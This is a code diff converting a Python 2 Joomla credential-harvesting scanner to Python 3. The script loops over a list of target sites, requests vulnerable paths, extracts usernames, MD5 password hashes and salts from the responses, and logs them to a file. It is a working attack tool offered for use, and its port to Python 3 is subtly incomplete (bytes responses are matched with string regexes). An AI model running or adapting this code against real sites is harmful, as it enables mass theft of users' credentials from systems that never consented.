@@ -1,7 +1,7 @@
 #List of sites accepted 
 #Salt Part has been added.
  
-import sys,os, re, urllib2, socket ,string
+import sys,os, re, urllib.request, urllib.error, urllib.parse, socket ,string
  
 if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
 	SysCls = ''
@@ -12,10 +12,10 @@ else:
  
 os.system(SysCls)
  
-print "\n\n"
+print("\n\n")
  
 if len(sys.argv) < 2: 
-	print "\n\n" 
+	print("\n\n") 
 	sys.exit(1)
  
 list= sys.argv[1]
@@ -23,11 +23,11 @@ try:
  
 	hosts= open(list,'r')
 except (IOError):
-	print " \n\nSite List Missing ..Exiting :("
+	print(" \n\nSite List Missing ..Exiting :(")
 	sys.exit(0)
  
-pre=raw_input("\nEnter the DB prefix or press Enter to use default\n") 
-salt= raw_input("\n Do you think target has salted or unsalted version ! press y for yes or n for no \n")
+pre=input("\nEnter the DB prefix or press Enter to use default\n") 
+salt= input("\n Do you think target has salted or unsalted version ! press y for yes or n for no \n")
 if pre=='':
 	pre="jos"
  
@@ -162,17 +162,17 @@ for host in hosts:
 	socket.setdefaulttimeout(10)
 	file=open ('hash.txt' , 'a')
 	file.write(host +'\t : ') 
-	print "[+] JoomlaPath:",host 
-	print "[+] Vuln. Loaded:",len(paths) 
+	print("[+] JoomlaPath:",host) 
+	print("[+] Vuln. Loaded:",len(paths)) 
 	if host[:7] != "http://": 
 		host = "http://"+host 
 	if host[-1:] != "/": 
 		host = host+"/" 
-	print "[+] Testing..." 
+	print("[+] Testing...") 
 	for path in paths: 
 		try: 
 			#print host+path 
-			source = urllib2.urlopen(host+path, "80").readlines() 
+			source = urllib.request.urlopen(host+path, "80").readlines() 
 			for line in source:
 				if salt=='y':
 					if (re.search("<p>",line) or re.search ('</p>',line)): # cleaning up the result
@@ -180,10 +180,10 @@ for host in hosts:
 					md5s=re.findall(":"+"[a-f0-9]"*32+":",line)
 					if (len(md5s)>=1):			
 						demo=line.split(":")
-						print "\nHost:",host+path 
-						print "\n User:"+demo[0]
-						print "\n Password: "+demo[1]
-						print "\n Salt:"+demo[2] 
+						print("\nHost:",host+path) 
+						print("\n User:"+demo[0])
+						print("\n Password: "+demo[1])
+						print("\n Salt:"+demo[2]) 
  
 				else:
 					md5s = re.findall(":"+"[a-f0-9]"*32,line) 
@@ -191,14 +191,14 @@ for host in hosts:
 					#print "\nHost:",host+path 
 					#print "\n User:"+demo[0]
 					if len(md5s) >=1: 
-						print "Found:" 
+						print("Found:") 
 						for md5 in md5s: 
-							print "\t-",md5
+							print("\t-",md5)
 							file.write( md5 +'\n'+host+path)
  
-		except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
+		except(urllib.error.URLError, socket.timeout, socket.gaierror, socket.error): 
 				pass 
 		except(KeyboardInterrupt): 
 				pass 
  
-	print "\n[-] Done\n"
+	print("\n[-] Done\n")
